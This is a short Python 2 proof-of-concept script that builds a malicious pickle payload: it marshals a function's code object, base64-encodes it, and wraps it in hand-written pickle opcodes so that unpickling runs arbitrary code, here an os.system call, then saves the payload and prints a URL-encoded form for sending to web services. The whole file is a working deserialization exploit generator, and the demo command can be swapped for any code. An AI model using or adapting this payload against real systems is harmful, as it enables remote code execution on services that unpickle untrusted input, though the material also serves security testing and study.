# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'
__filename__ = 'pickle_poc_gen0.py'

import marshal
import base64
import cPickle
import urllib

def foo():#you should write your code in this function
    import os
    def fib(n):
        if n <= 1:
            return n
        return fib(n-1) + fib(n-2)
    print 'fib(10) =', fib(10)
    os.system('echo anycode >>poc.txt')

try:#尝试使用cPickle来序列号代码对象
    cPickle.dumps(foo.func_code)
except Exception as e:
    print e #TypeError: can't pickle code objects

code_serialized = base64.b64encode(marshal.dumps(foo.func_code))
print code_serialized


#为了保证code_serialized中的内容得到执行，我们需要如下代码
#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), ''))()

payload =  """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

print "------------------------------------------------"
print payload
fp =open("poc.pickle","w")
fp.write(payload)
print "------------------------------------------------"
print urllib.quote(payload)

